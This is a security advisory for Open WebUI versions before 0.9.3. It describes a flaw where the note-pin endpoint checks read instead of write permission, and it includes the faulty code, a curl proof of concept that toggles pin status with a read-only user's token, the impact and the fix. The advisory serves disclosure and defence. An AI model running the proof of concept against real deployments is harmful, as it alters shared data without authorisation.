@@ -1,0 +1,109 @@
+PYSEC-2026-2745 PyPI/open-webui — Open WebUI: Read-Only Users Can Toggle Note Pin Status via Incorrect Permission Check (Write via Read-Only Access)
+package: open-webui
+ecosystem: PyPI
+versions affected:
+  >= 0, < 0.9.3 (ECOSYSTEM)
+aliases: CVE-2026-45316, GHSA-jx2x-j75f-xq3j
+references:
+  https://github.com/open-webui/open-webui/security/advisories/GHSA-jx2x-j75f-xq3j
+  https://nvd.nist.gov/vuln/detail/CVE-2026-45316
+  https://github.com/open-webui/open-webui
+  https://github.com/open-webui/open-webui/releases/tag/v0.9.3
+  https://pypi.org/project/open-webui
+  https://github.com/advisories/GHSA-jx2x-j75f-xq3j
+
+### Summary
+
+The `POST /api/v1/notes/{id}/pin` endpoint performs a write operation (toggling the `is_pinned` field) but only checks for `read` permission. Users with read-only access to a shared note can pin/unpin it, which is a state-modifying action that should require `write` permission. All other write endpoints (update, delete, access/update) correctly check for `write` permission.
+
+### Details
+
+**Affected code: `backend/open_webui/routers/notes.py` lines 412-444**
+
+```python
+@router.post('/{id}/pin', response_model=Optional[NoteModel])
+async def pin_note_by_id(...):
+    # ...
+    if user.role != 'admin' and (
+        user.id != note.user_id
+        and not await AccessGrants.has_access(
+            user_id=user.id,
+            resource_type='note',
+            resource_id=note.id,
+            permission='read',        # BUG: should be 'write'
+            db=db,
+        )
+    ):
+        raise HTTPException(...)
+    
+    note = await Notes.toggle_note_pinned_by_id(id, db=db)  # write operation
+```
+
+**Compare with update endpoint (correct, line 318-327):**
+```python
+async def update_note_by_id(...):
+    # ...
+    and not await AccessGrants.has_access(
+        permission='write',        # correctly checks 'write'
+    )
+```
+
+### PoC
+
+**Environment:** Open WebUI v0.9.2, default configuration with notes sharing enabled.
+
+**Setup:**
+1. UserA creates a note
+2. UserA shares note with UserB with `read` permission via `POST /api/v1/notes/{id}/access/update` with `{"access_grants":[{"principal_type":"user","principal_id":"USERB_ID","permission":"read"}]}`
+
+**Test:**
+```bash
+# Step 1: UserB reads note (READ permission) -> 200 OK, write_access: false
+curl -s http://TARGET/api/v1/notes/$NOTE_ID \
+  -H "Authorization: Bearer $TOKEN_B"
+# Result: 200 OK, "write_access": false
+
+# Step 2: UserB updates note (WRITE operation) -> 403 Forbidden (correctly blocked)
+curl -s -X POST http://TARGET/api/v1/notes/$NOTE_ID/update \
+  -H "Authorization: Bearer $TOKEN_B" \
+  -H "Content-Type: application/json" \
+  -d '{"title":"HACKED","content":"pwned","data":{"type":"note"}}'
+# Result: 403 Forbidden
+
+# Step 3: UserB pins note (WRITE operation, but only checks READ) -> 200 OK (BUG!)
+curl -s -X POST http://TARGET/api/v1/notes/$NOTE_ID/pin \
+  -H "Authorization: Bearer $TOKEN_B"
+# Result: 200 OK, "is_pinned": true
+
+# Step 4: UserB can toggle pin repeatedly
+curl -s -X POST http://TARGET/api/v1/notes/$NOTE_ID/pin \
+  -H "Authorization: Bearer $TOKEN_B"
+# Result: 200 OK, "is_pinned": false (toggled back)
+```
+
+**E2E Verified Result:**
+- Step 1: UserB reads note (READ) -> 200 OK ✓
+- Step 2: UserB updates note (WRITE) -> 403 Forbidden ✓ (correctly blocked)
+- Step 3: UserB pins note (WRITE via READ) -> 200 OK, is_pinned: true ✗ (BUG)
+- Step 4: UserB toggles pin again -> 200 OK, is_pinned: false ✗ (repeated write)
+
+### Impact
+
+- A user with only `read` access to a shared note can toggle its `is_pinned` status
+- This modifies the note's state without write authorization
+- The pin status change is visible to the note owner and all other users with access
+- Privilege escalation from read to write on the pin operation
+
+**Limitations:** Only affects the `is_pinned` boolean field. Cannot modify title, content, or access_grants. Requires at least read access via explicit sharing.
+
+### Fix
+
+One-line fix — change `permission='read'` to `permission='write'` in `pin_note_by_id`:
+
+```python
+# backend/open_webui/routers/notes.py, line 437
+- permission='read',
++ permission='write',
+```
+
+This makes the pin endpoint consistent with update and delete endpoints.
